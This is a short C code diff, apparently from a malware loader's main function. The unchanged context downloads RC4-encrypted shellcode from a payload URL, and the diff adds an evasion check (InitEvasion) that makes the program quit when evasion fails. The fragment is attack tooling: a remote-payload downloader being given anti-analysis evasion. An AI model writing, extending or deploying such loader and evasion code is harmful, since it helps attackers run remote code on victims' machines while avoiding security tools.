@@ -226,6 +226,10 @@ int main()
     PBYTE Rc4CipherText = NULL;
     SIZE_T sRc4CipherText = NULL;
 
+    if (InitEvasion() != 0) {
+        return 0xDEADBEEF; // Evasion failed, bailout
+	}
+
     //download the shellcode
     if (!GetPayloadFromUrl(PAYLOAD, &Rc4CipherText, &sRc4CipherText)) {
         return -1;
